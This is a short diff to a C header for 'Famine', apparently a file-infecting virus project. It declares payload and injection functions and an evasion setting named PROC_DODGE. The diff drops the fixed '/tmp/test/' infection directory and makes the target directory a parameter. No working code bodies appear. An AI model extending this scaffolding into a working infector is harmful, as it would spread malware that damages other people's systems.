@@ -46,7 +46,6 @@
 
 
 /* config */
-# define INFESTED_DIR "/tmp/test/"
 # define PROC_DODGE "man"
 
 # define SIGNATURE "Famine version 1.0 (c)oded by gmorer-rcarette"
@@ -114,7 +113,7 @@ void payload(void);
 int inject(t_data data);
 
 /* binary_finder.c */
-int finder(t_data data, int fd);
+int finder(t_data data, int fd, char *dir);
 
 /* lib.c */
 size_t	ft_strlen(char *str);
